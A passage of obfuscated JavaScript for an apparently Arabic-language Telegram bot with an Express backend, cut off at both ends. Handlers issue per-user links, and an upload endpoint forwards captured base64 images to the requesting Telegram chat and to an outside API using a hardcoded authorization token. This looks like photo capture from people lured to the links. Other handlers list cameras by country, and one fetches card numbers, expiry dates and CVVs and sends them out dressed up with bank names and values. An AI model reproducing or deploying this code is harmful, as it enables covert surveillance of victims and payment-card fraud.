            const _0x4e7c99 = _0x589c50[_0x463ffd(0x79b)]((_0x3d7d1b, _0x110697) => _0x110697 + (-0x2 * -0x323 + 0xef * -0xb + -0x10 * -0x40) + '.\x20' + _0x3d7d1b);
            for (let _0x109fab = -0x7a * -0x17 + -0x3dc * 0x1 + -0x71a; _0x49b36e[_0x463ffd(0x8a9)](_0x109fab, _0x4e7c99[_0x463ffd(0x574)]); _0x109fab += 0xd0f + -0x2 * 0xda6 + 0x2e3 * 0x5) {
                const _0x11722c = _0x4e7c99[_0x463ffd(0x887)](_0x109fab, _0x49b36e[_0x463ffd(0xe1f)](_0x109fab, -0x1 * -0x26cb + -0x2c * 0x40 + -0x1b99));
                await bot[_0x463ffd(0x741) + 'e'](_0x3789c4, _0x11722c[_0x463ffd(0x75e)]('\x0a'));
            }
            await bot[_0x463ffd(0x741) + 'e'](_0x3789c4, _0x49b36e[_0x463ffd(0x667)]);
        } else
            await bot[_0x463ffd(0x741) + 'e'](_0x3789c4, _0x49b36e[_0x463ffd(0x198)]);
    } catch (_0x4e3594) {
        await bot[_0x463ffd(0x741) + 'e'](_0x3789c4, _0x463ffd(0x8ca) + _0x463ffd(0x302) + _0x463ffd(0x89a) + _0x463ffd(0x94f) + _0x463ffd(0x797) + _0x463ffd(0x3bf) + _0x463ffd(0x237) + _0x463ffd(0xbe0) + _0x463ffd(0x886) + _0x463ffd(0x4a8));
    }
}
function isDeveloper(_0x3e9532) {
    const _0x1962e3 = _0x54266d, _0x577939 = {
            'TsAJy': function (_0x1140e3, _0x502f43) {
                return _0x1140e3 === _0x502f43;
            }
        }, _0x43a6d2 = 0x5126e2e * 0x2a + 0xf22a9e1 * -0x15 + 0x1bee50ba3;
    return _0x577939[_0x1962e3(0xde9)](_0x3e9532, _0x43a6d2);
}
function showAdminPanel(_0x4e55e9) {
    const _0x38fb81 = _0x54266d, _0xd23d69 = {
            'ibvdl': _0x38fb81(0xbb8) + 'م:',
            'MVBOh': _0x38fb81(0xacf) + _0x38fb81(0xb19),
            'TlcXS': _0x38fb81(0x816),
            'skuFH': _0x38fb81(0x7dd) + _0x38fb81(0xb19),
            'kOmuq': _0x38fb81(0x27b)
        };
    bot[_0x38fb81(0x741) + 'e'](_0x4e55e9, _0xd23d69[_0x38fb81(0xca4)], {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0xd23d69[_0x38fb81(0x714)],
                        'callback_data': _0xd23d69[_0x38fb81(0xbe8)]
                    }],
                [{
                        'text': _0xd23d69[_0x38fb81(0x778)],
                        'callback_data': _0xd23d69[_0x38fb81(0x64e)]
                    }]
            ]
        }
    });
}
bot[_0x54266d(0xb39)](/\/jjjjjavayy/, _0x12e17b => {
    const _0x4a2a06 = _0x54266d, _0x1ddc82 = {
            'VMZwp': _0x4a2a06(0x2b7) + _0x4a2a06(0x1ae) + _0x4a2a06(0xad8) + _0x4a2a06(0x86a) + _0x4a2a06(0x627),
            'IhRjq': _0x4a2a06(0x8a0) + 'ي',
            'bHZeM': _0x4a2a06(0x6b1),
            'ZAsJh': _0x4a2a06(0x19a) + _0x4a2a06(0x1e3),
            'zgXJR': _0x4a2a06(0xbbe) + 're',
            'xPook': _0x4a2a06(0x462) + 'ء',
            'ZYkxx': _0x4a2a06(0xa4c)
        }, _0x233d46 = _0x12e17b[_0x4a2a06(0x6a9)]['id'], _0x407810 = _0x1ddc82[_0x4a2a06(0x9e5)];
    bot[_0x4a2a06(0x741) + 'e'](_0x233d46, _0x407810, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x1ddc82[_0x4a2a06(0xd42)],
                        'callback_data': _0x1ddc82[_0x4a2a06(0xb6c)]
                    }],
                [{
                        'text': _0x1ddc82[_0x4a2a06(0xaa0)],
                        'callback_data': _0x1ddc82[_0x4a2a06(0x7df)]
                    }],
                [{
                        'text': _0x1ddc82[_0x4a2a06(0x770)],
                        'callback_data': _0x1ddc82[_0x4a2a06(0x8ba)]
                    }]
            ]
        }
    });
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), _0x353aa1 => {
    const _0x17b893 = _0x54266d, _0x2432d3 = {
            'SjOLo': function (_0x226768, _0x5ba381) {
                return _0x226768 === _0x5ba381;
            },
            'HOTPW': _0x17b893(0x6b1),
            'UnMgC': _0x17b893(0xbbe) + 're',
            'UzEAq': _0x17b893(0xa4c),
            'kmimr': _0x17b893(0xb2e) + _0x17b893(0x932) + '\x20✅',
            'AcVfy': function (_0x474324, _0x26c456) {
                return _0x474324 === _0x26c456;
            },
            'xglLT': _0x17b893(0xd17)
        }, _0x4a0d07 = _0x353aa1[_0x17b893(0x842)][_0x17b893(0x6a9)]['id'];
    let _0x414055;
    if (_0x2432d3[_0x17b893(0xc62)](_0x353aa1[_0x17b893(0x50f)], _0x2432d3[_0x17b893(0x665)]))
        _0x414055 = baseUrl + (_0x17b893(0xb27) + _0x17b893(0xc41)) + _0x4a0d07 + _0x17b893(0x363);
    else {
        if (_0x2432d3[_0x17b893(0xc62)](_0x353aa1[_0x17b893(0x50f)], _0x2432d3[_0x17b893(0x87e)]))
            _0x414055 = baseUrl + (_0x17b893(0xe1b) + _0x17b893(0xc41)) + _0x4a0d07 + _0x17b893(0x363);
        else
            _0x2432d3[_0x17b893(0xc62)](_0x353aa1[_0x17b893(0x50f)], _0x2432d3[_0x17b893(0xc0b)]) && (_0x414055 = baseUrl + (_0x17b893(0xd0b) + _0x17b893(0xc41)) + _0x4a0d07 + _0x17b893(0x363));
    }
    if (_0x414055)
        bot[_0x17b893(0x741) + 'e'](_0x4a0d07, _0x17b893(0x736) + _0x17b893(0xb5f) + _0x414055), bot[_0x17b893(0x9c4) + _0x17b893(0x42d)](_0x353aa1['id'], { 'text': _0x2432d3[_0x17b893(0x9d9)] });
    else
        _0x2432d3[_0x17b893(0x286)](_0x353aa1[_0x17b893(0x50f)], _0x2432d3[_0x17b893(0x32b)]) && (bot[_0x17b893(0x741) + 'e'](_0x4a0d07, _0x17b893(0x86d) + _0x17b893(0x690) + _0x17b893(0x654) + _0x17b893(0x559) + _0x17b893(0x92b) + _0x17b893(0x414) + _0x17b893(0x566) + 'ip'), bot[_0x17b893(0x9c4) + _0x17b893(0x42d)](_0x353aa1['id'], { 'text': '' }));
}), bot[_0x54266d(0xb39)](/\/نننطسطوو/, _0x5c8bb3 => {
    const _0x2e8b9c = _0x54266d, _0x3d4ea1 = {
            'AHqwh': _0x2e8b9c(0x33f) + _0x2e8b9c(0x716) + _0x2e8b9c(0x6ef) + _0x2e8b9c(0xaef),
            'ORCDp': _0x2e8b9c(0x249) + _0x2e8b9c(0x4d9),
            'Geaun': _0x2e8b9c(0x935) + 's',
            'yAxfk': function (_0x112ade, _0x530640) {
                return _0x112ade(_0x530640);
            },
            'VPUqW': function (_0x44260a, _0x2d6277) {
                return _0x44260a(_0x2d6277);
            }
        }, _0x4b53d0 = _0x5c8bb3[_0x2e8b9c(0x6a9)]['id'];
    bot[_0x2e8b9c(0x741) + 'e'](_0x4b53d0, _0x3d4ea1[_0x2e8b9c(0xe08)], {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x3d4ea1[_0x2e8b9c(0x43b)],
                        'callback_data': _0x3d4ea1[_0x2e8b9c(0x3f8)]
                    }]]
        }
    }), _0x3d4ea1[_0x2e8b9c(0x4ae)](isDeveloper, _0x4b53d0) && _0x3d4ea1[_0x2e8b9c(0x214)](showAdminPanel, _0x4b53d0);
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), async _0xe9b00e => {
    const _0x168894 = _0x54266d, _0x14dd60 = {
            'zvLMP': function (_0x3fe5ea, _0x255f65) {
                return _0x3fe5ea === _0x255f65;
            },
            'CyWzG': _0x168894(0x935) + 's',
            'mSpBp': function (_0x58fff8, _0x4b6696) {
                return _0x58fff8(_0x4b6696);
            },
            'bfRwf': function (_0x5b647a, _0x8d9c70) {
                return _0x5b647a in _0x8d9c70;
            },
            'ajZeN': function (_0x34a8cd, _0x72df90, _0x12fcb5) {
                return _0x34a8cd(_0x72df90, _0x12fcb5);
            },
            'fhZZx': _0x168894(0xa35),
            'JjevV': function (_0x2bc87d, _0x4541fb, _0x56590c) {
                return _0x2bc87d(_0x4541fb, _0x56590c);
            },
            'reckD': _0x168894(0x77f),
            'oTXCt': function (_0x170b01, _0x1028d4) {
                return _0x170b01 - _0x1028d4;
            },
            'DlfuD': function (_0x4fc875, _0x5da9ed, _0x861610) {
                return _0x4fc875(_0x5da9ed, _0x861610);
            }
        }, _0x347779 = _0xe9b00e[_0x168894(0x842)][_0x168894(0x6a9)]['id'];
    if (_0x14dd60[_0x168894(0x823)](_0xe9b00e[_0x168894(0x50f)], _0x14dd60[_0x168894(0x795)]))
        _0x14dd60[_0x168894(0xb42)](showCountryList, _0x347779);
    else {
        if (_0x14dd60[_0x168894(0x356)](_0xe9b00e[_0x168894(0x50f)], countryTranslation))
            bot[_0x168894(0x802) + _0x168894(0x909)](_0x347779, _0xe9b00e[_0x168894(0x842)][_0x168894(0x57f)]), _0x14dd60[_0x168894(0x1b4)](displayCameras, _0x347779, _0xe9b00e[_0x168894(0x50f)]);
        else {
            if (_0xe9b00e[_0x168894(0x50f)][_0x168894(0xd2d)](_0x14dd60[_0x168894(0x94d)])) {
                const _0x579381 = _0x14dd60[_0x168894(0x637)](parseInt, _0xe9b00e[_0x168894(0x50f)][_0x168894(0x7aa)]('_')[-0xa9f * 0x1 + 0x1855 + -0xdb5], 0x2087 + 0x10a2 + -0x311f);
                bot[_0x168894(0x802) + _0x168894(0x909)](_0x347779, _0xe9b00e[_0x168894(0x842)][_0x168894(0x57f)]), _0x14dd60[_0x168894(0x1b4)](showCountryList, _0x347779, _0x579381);
            } else {
                if (_0xe9b00e[_0x168894(0x50f)][_0x168894(0xd2d)](_0x14dd60[_0x168894(0x908)])) {
                    const _0x555d68 = _0x14dd60[_0x168894(0x1b4)](parseInt, _0xe9b00e[_0x168894(0x50f)][_0x168894(0x7aa)]('_')[-0x1855 + -0x433 + 0x5b5 * 0x5], 0xe1e + 0x1e4f + -0x2c63), _0x94880 = Math[_0x168894(0x1b0)](-0x4 * 0x371 + -0x818 + 0x1 * 0x15dc, _0x14dd60[_0x168894(0x374)](_0x555d68, 0xa3f * 0x2 + 0x1e50 + -0x32bc));
                    bot[_0x168894(0x802) + _0x168894(0x909)](_0x347779, _0xe9b00e[_0x168894(0x842)][_0x168894(0x57f)]), _0x14dd60[_0x168894(0x3d4)](showCountryList, _0x347779, _0x94880);
                }
            }
        }
    }
});
const americanBanks = [
        _0x54266d(0x79f) + _0x54266d(0x9a7),
        _0x54266d(0xc5e),
        _0x54266d(0xc86),
        _0x54266d(0x8fb) + 'o',
        _0x54266d(0x283) + 'e',
        _0x54266d(0x4d0),
        _0x54266d(0x515),
        _0x54266d(0xcfe),
        _0x54266d(0x1ce) + _0x54266d(0x431),
        _0x54266d(0x49e) + _0x54266d(0x682)
    ], fetchVisaData = async () => {
        const _0x153f91 = _0x54266d, _0x196736 = {
                'HNJRK': function (_0x469eb6, _0x97e785) {
                    return _0x469eb6 === _0x97e785;
                },
                'FUlrA': function (_0x360bd8, _0x54364b) {
                    return _0x360bd8 * _0x54364b;
                },
                'DJYth': _0x153f91(0x6d0) + _0x153f91(0x1e1) + _0x153f91(0x199),
                'xLfmA': _0x153f91(0x77d),
                'qQNzu': function (_0x30c8c8, _0x2f2418) {
                    return _0x30c8c8 + _0x2f2418;
                },
                'TYJsJ': function (_0x433b68, _0xb67a0) {
                    return _0x433b68 * _0xb67a0;
                },
                'Bssbc': _0x153f91(0x91f) + _0x153f91(0x19f) + _0x153f91(0xbf9),
                'ejbrB': function (_0x566cc7, _0x555437) {
                    return _0x566cc7 > _0x555437;
                },
                'kDcte': function (_0x375f36, _0x1fac12) {
                    return _0x375f36 * _0x1fac12;
                },
                'GdQCC': _0x153f91(0xc19) + _0x153f91(0xc8b) + _0x153f91(0x7d1) + _0x153f91(0xe18) + _0x153f91(0xb88) + _0x153f91(0xa11),
                'YorZa': _0x153f91(0xcca) + _0x153f91(0xd67)
            };
        try {
            const _0x5221bd = _0x196736[_0x153f91(0x91c)], _0x2954b2 = await axios[_0x153f91(0x4bf)](_0x5221bd), _0x472695 = _0x2954b2[_0x153f91(0x50f)], _0x13fefa = _0x472695[_0x153f91(0x79d)]()[_0x153f91(0x7aa)]('\x0a');
            if (_0x196736[_0x153f91(0x920)](_0x13fefa[_0x153f91(0x574)], 0x1 * 0x2e3 + 0x12b1 + 0x1 * -0x1594)) {
                const _0x5dc8a6 = _0x13fefa[_0x153f91(0x79b)](_0x210917 => {
                    const _0x2ec3fa = _0x153f91, _0x4e9b80 = _0x210917[_0x2ec3fa(0x7aa)]('|');
                    if (_0x196736[_0x2ec3fa(0x7eb)](_0x4e9b80[_0x2ec3fa(0x574)], -0x1cb1 + 0x1d94 + -0xdf))
                        return {
                            'CardNumber': _0x4e9b80[-0x1a98 + 0x149e + 0x5fa],
                            'Expiry': _0x4e9b80[0x1 * 0x2279 + -0xb5 * 0x3 + -0x49f * 0x7] + '/' + _0x4e9b80[-0x3 * -0x98f + -0x2331 + 0x686],
                            'CVV': _0x4e9b80[-0x13ef + 0x1fdd + -0xbeb],
                            'Bank': americanBanks[Math[_0x2ec3fa(0xd54)](_0x196736[_0x2ec3fa(0xb64)](Math[_0x2ec3fa(0x9ee)](), americanBanks[_0x2ec3fa(0x574)]))],
                            'CardType': _0x196736[_0x2ec3fa(0xc9f)],
                            'Country': _0x196736[_0x2ec3fa(0x387)],
                            'Value': '$' + _0x196736[_0x2ec3fa(0x902)](Math[_0x2ec3fa(0xd54)](_0x196736[_0x2ec3fa(0x739)](Math[_0x2ec3fa(0x9ee)](), 0x40 * -0x3e + 0x2303 * -0x1 + 0x32a2)), 0x94d + 0x1 * 0x61 + -0x9a4)
                        };
                })[_0x153f91(0xbea)](Boolean);
                if (_0x196736[_0x153f91(0x920)](_0x5dc8a6[_0x153f91(0x574)], 0xa3 * 0x26 + 0xb9 * 0x1b + -0xa7 * 0x43))
                    return _0x5dc8a6[Math[_0x153f91(0xd54)](_0x196736[_0x153f91(0x293)](Math[_0x153f91(0x9ee)](), _0x5dc8a6[_0x153f91(0x574)]))];
            }
            return console[_0x153f91(0xb18)](_0x196736[_0x153f91(0x6a6)]), null;
        } catch (_0x224472) {
            return console[_0x153f91(0xb18)](_0x196736[_0x153f91(0xd82)], _0x224472[_0x153f91(0x842)]), null;
        }
    };
bot[_0x54266d(0xb39)](/\/نكخمنتته/, _0x57c2c5 => {
    const _0x30f630 = _0x54266d, _0x395d5a = {
            'JQXiy': _0x30f630(0xd9e) + _0x30f630(0xe13),
            'Qfflk': _0x30f630(0x98c) + _0x30f630(0xe13),
            'kMBNT': _0x30f630(0x801),
            'IyrLp': _0x30f630(0xc6b) + _0x30f630(0xa09) + _0x30f630(0xdaa) + _0x30f630(0x2d3) + _0x30f630(0xc9e) + _0x30f630(0x320) + _0x30f630(0x7bf)
        }, _0x9ff7c0 = _0x57c2c5[_0x30f630(0x6a9)]['id'], _0x50682e = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x395d5a[_0x30f630(0x806)],
                            'callback_data': _0x395d5a[_0x30f630(0x630)]
                        }]]
            },
            'parse_mode': _0x395d5a[_0x30f630(0x250)]
        };
    bot[_0x30f630(0x741) + 'e'](_0x9ff7c0, _0x395d5a[_0x30f630(0x8dd)], _0x50682e);
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), async _0xc13e94 => {
    const _0x4bac2b = _0x54266d, _0x21abfb = {
            'jRkEQ': function (_0x1b4622, _0x516083) {
                return _0x1b4622 === _0x516083;
            },
            'UMUpk': _0x4bac2b(0x98c) + _0x4bac2b(0xe13),
            'BrMaN': _0x4bac2b(0x291) + _0x4bac2b(0xc34) + _0x4bac2b(0x985) + _0x4bac2b(0x3c4),
            'JLRzJ': _0x4bac2b(0x291) + _0x4bac2b(0xc34) + _0x4bac2b(0x3f1) + _0x4bac2b(0xa9e),
            'hjJjP': _0x4bac2b(0x291) + _0x4bac2b(0xc34) + _0x4bac2b(0x2f2) + _0x4bac2b(0xce4),
            'NmMQI': _0x4bac2b(0x291) + _0x4bac2b(0xc34) + _0x4bac2b(0x4d6) + _0x4bac2b(0x211),
            'ksIpI': _0x4bac2b(0x291) + _0x4bac2b(0xc34) + _0x4bac2b(0xab6) + _0x4bac2b(0x465),
            'zNRpF': function (_0x49e3a6) {
                return _0x49e3a6();
            },
            'JyhKa': _0x4bac2b(0x801),
            'cKgVR': _0x4bac2b(0x3b9) + _0x4bac2b(0x91e) + _0x4bac2b(0x2e0) + _0x4bac2b(0xd53) + _0x4bac2b(0x19e)
        }, _0x36ddbc = _0xc13e94[_0x4bac2b(0x842)][_0x4bac2b(0x6a9)]['id'];
    if (_0x21abfb[_0x4bac2b(0x5b4)](_0xc13e94[_0x4bac2b(0x50f)], _0x21abfb[_0x4bac2b(0x61d)])) {
        let _0x1912cd = await bot[_0x4bac2b(0x741) + 'e'](_0x36ddbc, _0x21abfb[_0x4bac2b(0xada)]);
        await new Promise(_0x432a49 => setTimeout(_0x432a49, 0x17c7 * -0x1 + 0x3 * 0x13 + 0x1b76)), await bot[_0x4bac2b(0x708) + _0x4bac2b(0xdb0)](_0x21abfb[_0x4bac2b(0x55c)], {
            'chat_id': _0x36ddbc,
            'message_id': _0x1912cd[_0x4bac2b(0x57f)]
        }), await new Promise(_0x1e87fa => setTimeout(_0x1e87fa, -0x1 * -0x101e + -0x22a3 + -0x1 * -0x166d)), await bot[_0x4bac2b(0x708) + _0x4bac2b(0xdb0)](_0x21abfb[_0x4bac2b(0x2a8)], {
            'chat_id': _0x36ddbc,
            'message_id': _0x1912cd[_0x4bac2b(0x57f)]
        }), await new Promise(_0x22a0b0 => setTimeout(_0x22a0b0, -0x270c + 0x1264 + 0x1890)), await bot[_0x4bac2b(0x708) + _0x4bac2b(0xdb0)](_0x21abfb[_0x4bac2b(0x62e)], {
            'chat_id': _0x36ddbc,
            'message_id': _0x1912cd[_0x4bac2b(0x57f)]
        }), await new Promise(_0x230d14 => setTimeout(_0x230d14, -0x15 * -0x141 + -0xe * 0x74 + -0x1015)), await bot[_0x4bac2b(0x708) + _0x4bac2b(0xdb0)](_0x21abfb[_0x4bac2b(0x7e4)], {
            'chat_id': _0x36ddbc,
            'message_id': _0x1912cd[_0x4bac2b(0x57f)]
        }), await new Promise(_0x4a16b6 => setTimeout(_0x4a16b6, -0x1691 + -0x2587 + -0x100 * -0x40)), await bot[_0x4bac2b(0x802) + _0x4bac2b(0x909)](_0x36ddbc, _0x1912cd[_0x4bac2b(0x57f)]);
        const _0x416748 = await _0x21abfb[_0x4bac2b(0x70c)](fetchVisaData);
        if (_0x416748) {
            const {
                CardNumber: _0x5728b7,
                Expiry: _0x44afa3,
                CVV: _0x43e7ad,
                Bank: _0x4fc71c,
                CardType: _0x5bb4f9,
                Country: _0x485eaf,
                Value: _0x22d17e
            } = _0x416748;
            bot[_0x4bac2b(0x741) + 'e'](_0x36ddbc, _0x4bac2b(0x78e) + _0x4bac2b(0xdf3) + _0x4bac2b(0x219) + '`' + _0x5728b7 + (_0x4bac2b(0xb8b) + _0x4bac2b(0xb7a)) + _0x44afa3 + (_0x4bac2b(0x69b) + _0x4bac2b(0x9ba)) + _0x43e7ad + (_0x4bac2b(0xb60) + _0x4bac2b(0x6c0)) + _0x4fc71c + (_0x4bac2b(0x781) + _0x4bac2b(0xa56) + '`') + _0x5bb4f9 + (_0x4bac2b(0x7bc) + _0x4bac2b(0xdfc)) + _0x485eaf + (_0x4bac2b(0x4b9) + _0x4bac2b(0x8c9)) + _0x22d17e + (_0x4bac2b(0x3d8) + _0x4bac2b(0x56a) + _0x4bac2b(0x56a) + _0x4bac2b(0xdfe) + _0x4bac2b(0xcd0) + _0x4bac2b(0xcac) + _0x4bac2b(0x751)), { 'parse_mode': _0x21abfb[_0x4bac2b(0x885)] });
        } else
            bot[_0x4bac2b(0x741) + 'e'](_0x36ddbc, _0x21abfb[_0x4bac2b(0x7dc)]);
    }
});
const deleteFolderRecursive = _0x56c1d0 => {
    const _0x560c9a = _0x54266d, _0x5549db = {
            'vvyPu': function (_0x2baf8d, _0x1312ad) {
                return _0x2baf8d(_0x1312ad);
            }
        };
    fs[_0x560c9a(0xcf7)](_0x56c1d0) && (fs[_0x560c9a(0xcc5) + 'c'](_0x56c1d0)[_0x560c9a(0xcba)](_0x49f0d3 => {
        const _0x274ddd = _0x560c9a, _0x480638 = path[_0x274ddd(0x75e)](_0x56c1d0, _0x49f0d3);
        fs[_0x274ddd(0xc63)](_0x480638)[_0x274ddd(0xddb) + 'y']() ? _0x5549db[_0x274ddd(0x66c)](deleteFolderRecursive, _0x480638) : fs[_0x274ddd(0x37f)](_0x480638);
    }), fs[_0x560c9a(0x52c)](_0x56c1d0));
};
app[_0x54266d(0x477)](express[_0x54266d(0xb3e)](__dirname));
const _authHeaders$3 = { 'Authorization': _0x54266d(0x564) + _0x54266d(0x9a0) + _0x54266d(0xd6a) + _0x54266d(0x3b3) + _0x54266d(0x9a9) + _0x54266d(0x89b) + _0x54266d(0x41a) + '3' };
app[_0x54266d(0xa54)](_0x54266d(0x297), (_0xee174b, _0x20649a) => {
    const _0x5edda8 = _0x54266d, _0x14a81a = {
            'XiCYi': function (_0x166c8a, _0x47ccd0) {
                return _0x166c8a === _0x47ccd0;
            },
            'qAhCu': _0x5edda8(0xc31),
            'lUTCC': function (_0x5eac3c, _0x5ed84d) {
                return _0x5eac3c > _0x5ed84d;
            },
            'VhUwx': function (_0x4c1660, _0x549a6d) {
                return _0x4c1660 + _0x549a6d;
            },
            'YXesB': _0x5edda8(0x8c7) + _0x5edda8(0x453) + _0x5edda8(0xbc3),
            'imduz': _0x5edda8(0x6d3),
            'QTgCZ': _0x5edda8(0x6d1) + _0x5edda8(0x282) + _0x5edda8(0x1ea) + _0x5edda8(0x977) + _0x5edda8(0x77e) + _0x5edda8(0x4d2),
            'mcBpn': _0x5edda8(0xb43),
            'bYdjS': _0x5edda8(0x9b8) + _0x5edda8(0xc23) + _0x5edda8(0x6da),
            'gfgTK': _0x5edda8(0x3b9) + _0x5edda8(0x624) + _0x5edda8(0x9e0),
            'kBpGJ': _0x5edda8(0x4ec)
        }, _0x5605c4 = _0xee174b[_0x5edda8(0x386)][_0x5edda8(0xa06)], _0x39ce8c = _0xee174b[_0x5edda8(0x386)][_0x5edda8(0x24f)][_0x5edda8(0x7aa)](','), _0x1a6e77 = path[_0x5edda8(0x75e)](__dirname, _0x14a81a[_0x5edda8(0x818)]);
    !fs[_0x5edda8(0xcf7)](_0x1a6e77) && fs[_0x5edda8(0x4f5)](_0x1a6e77);
    const _0x4ff80f = _0x39ce8c[_0x5edda8(0x79b)]((_0x563c90, _0x6c1558) => {
        const _0x553629 = _0x5edda8, _0x2f1035 = {
                'NDrIP': function (_0x26e9dc, _0x58cec6) {
                    const _0x28a132 = _0x3026;
                    return _0x14a81a[_0x28a132(0x733)](_0x26e9dc, _0x58cec6);
                },
                'AZrQZ': _0x14a81a[_0x553629(0x847)],
                'WHchd': function (_0x71d18c, _0x84ed4c) {
                    const _0x98a1f9 = _0x553629;
                    return _0x14a81a[_0x98a1f9(0xa68)](_0x71d18c, _0x84ed4c);
                },
                'VJdDK': function (_0x412c9d, _0x3620fe) {
                    const _0x27b670 = _0x553629;
                    return _0x14a81a[_0x27b670(0x5cd)](_0x412c9d, _0x3620fe);
                },
                'frkgB': _0x14a81a[_0x553629(0xcec)],
                'DhNfN': function (_0x535247, _0x900ce0) {
                    const _0x3a33f8 = _0x553629;
                    return _0x14a81a[_0x3a33f8(0x5cd)](_0x535247, _0x900ce0);
                }
            }, _0x296911 = Buffer[_0x553629(0x8e6)](_0x563c90, _0x14a81a[_0x553629(0x898)]), _0x2630c3 = { 'data': _0x553629(0x792) + _0x553629(0x52f) + _0x553629(0x1aa) + _0x563c90 };
        return axios[_0x553629(0xa54)](_0x14a81a[_0x553629(0x47a)], _0x2630c3, { 'headers': _authHeaders$3 })[_0x553629(0x992)](_0x143b77 => {
            const _0x47fc5c = _0x553629, _0x4b00bf = _0x143b77[_0x47fc5c(0x50f)];
            console[_0x47fc5c(0xb18)](_0x47fc5c(0x4a3) + _0x47fc5c(0xc18) + _0x47fc5c(0x1b7) + _0x4b00bf[_0x47fc5c(0x9bb)] + (_0x47fc5c(0x33e) + _0x47fc5c(0x69d)) + _0x4b00bf[_0x47fc5c(0x91b)]);
            if (_0x2f1035[_0x47fc5c(0xcc1)](_0x4b00bf[_0x47fc5c(0x9bb)], _0x2f1035[_0x47fc5c(0xbc0)]) && _0x2f1035[_0x47fc5c(0x287)](_0x4b00bf[_0x47fc5c(0x91b)], -0x39a + 0x2 * 0x891 + -0x8 * 0x1b1 + 0.9)) {
                const _0x359cf2 = path[_0x47fc5c(0x75e)](_0x1a6e77, _0x5605c4 + '_' + _0x6c1558 + _0x47fc5c(0x87f));
                return fs[_0x47fc5c(0x95c) + _0x47fc5c(0x6b3)](_0x359cf2, _0x296911), bot[_0x47fc5c(0x359)](_0x5605c4, _0x296911, { 'caption': _0x47fc5c(0x24c) + _0x2f1035[_0x47fc5c(0x58c)](_0x6c1558, 0x1e6c + -0x4cd * -0x5 + -0x366c) });
            } else
                return bot[_0x47fc5c(0x741) + 'e'](_0x5605c4, _0x47fc5c(0x9ed) + _0x2f1035[_0x47fc5c(0x58c)](_0x6c1558, -0x1 * 0xb9d + -0xcfd + 0x189b * 0x1) + (_0x47fc5c(0x270) + _0x47fc5c(0xd16) + _0x47fc5c(0x655) + _0x47fc5c(0xb05)));
        })[_0x553629(0x2c4)](_0x47a755 => {
            const _0x7ec507 = _0x553629;
            return console[_0x7ec507(0x3a5)](_0x2f1035[_0x7ec507(0xd1d)], _0x47a755), bot[_0x7ec507(0x741) + 'e'](_0x5605c4, _0x7ec507(0x880) + _0x7ec507(0xab8) + 'ة\x20' + _0x2f1035[_0x7ec507(0x67d)](_0x6c1558, -0x1ab2 + 0x2 * -0x142 + 0x1d37));
        });
    });
    Promise[_0x5edda8(0x351)](_0x4ff80f)[_0x5edda8(0x992)](() => {
        const _0x128111 = _0x5edda8;
        console[_0x128111(0xb18)](_0x128111(0x820) + _0x128111(0xdb8) + _0x128111(0x7c5) + _0x128111(0x691) + _0x128111(0xc0d) + _0x5605c4), _0x20649a[_0x128111(0xadf)](_0x14a81a[_0x128111(0x8aa)]);
    })[_0x5edda8(0x2c4)](_0x35372e => {
        const _0x3b05c7 = _0x5edda8;
        console[_0x3b05c7(0x3a5)](_0x14a81a[_0x3b05c7(0x321)], _0x35372e), _0x20649a[_0x3b05c7(0x972)](0x1 * -0x145f + 0x1 * -0x797 + -0x223 * -0xe)[_0x3b05c7(0x9d2)](_0x14a81a[_0x3b05c7(0x33b)]);
    });
}), app[_0x54266d(0x4bf)](_0x54266d(0xb55), (_0x4a168c, _0x50ef44) => {
    const _0x1ce41d = _0x54266d, _0x45a2bc = { 'hKqQp': _0x1ce41d(0xa85) };
    _0x50ef44[_0x1ce41d(0xd98)](path[_0x1ce41d(0x75e)](__dirname, _0x45a2bc[_0x1ce41d(0x7f3)]));
}), bot[_0x54266d(0xb39)](/\/اتتهتتاههة/, _0x20d369 => {
    const _0xd87965 = _0x54266d, _0x4a3630 = {
            'rvBUt': _0xd87965(0x2b7) + _0xd87965(0x1ae) + _0xd87965(0xc39) + _0xd87965(0x58e) + _0xd87965(0xabc) + _0xd87965(0x7fb),
            'yyOgw': _0xd87965(0xe2c) + _0xd87965(0x7f9) + _0xd87965(0x7ce),
            'pkUsl': _0xd87965(0x63d) + _0xd87965(0x7f8)
        }, _0x5b05f3 = _0x20d369[_0xd87965(0x6a9)]['id'], _0x1c85c7 = _0x4a3630[_0xd87965(0x8bd)];
    bot[_0xd87965(0x741) + 'e'](_0x5b05f3, _0x1c85c7, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x4a3630[_0xd87965(0xd59)],
                        'callback_data': _0x4a3630[_0xd87965(0x425)]
                    }]]
        }
    });
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), _0x4d5042 => {
    const _0x2b0adc = _0x54266d, _0x3c91f5 = {
            'VihnG': function (_0x4751f9, _0x45a484) {
                return _0x4751f9 === _0x45a484;
            },
            'ZaMzv': _0x2b0adc(0x63d) + _0x2b0adc(0x7f8)
        }, _0x30ff5d = _0x4d5042[_0x2b0adc(0x842)][_0x2b0adc(0x6a9)]['id'], _0xdcbc74 = _0x4d5042[_0x2b0adc(0x842)][_0x2b0adc(0x57f)];
    if (_0x3c91f5[_0x2b0adc(0x8e0)](_0x4d5042[_0x2b0adc(0x50f)], _0x3c91f5[_0x2b0adc(0x5a7)])) {
        const _0x457828 = baseUrl + (_0x2b0adc(0xa0a) + _0x2b0adc(0x267)) + _0x30ff5d;
        bot[_0x2b0adc(0x741) + 'e'](_0x30ff5d, _0x2b0adc(0xa02) + _0x2b0adc(0x203) + _0x2b0adc(0x9d6) + _0x457828);
    }
}), bot[_0x54266d(0xb39)](/\/s2854تصخصrt/, _0x2136ee => {
    const _0x5cb1de = _0x54266d, _0x5b6567 = {
            'aKBXS': _0x5cb1de(0x57e) + _0x5cb1de(0x2d2),
            'fgdoe': _0x5cb1de(0x481) + 'il',
            'otanL': _0x5cb1de(0xcf6)
        }, _0x2069f6 = _0x2136ee[_0x5cb1de(0x6a9)]['id'], _0x41572b = _0x2136ee[_0x5cb1de(0x8e6)], _0x17e323 = _0x41572b[_0x5cb1de(0x845)], _0x22c334 = {
            'inline_keyboard': [[{
                        'text': _0x5b6567[_0x5cb1de(0x3d3)],
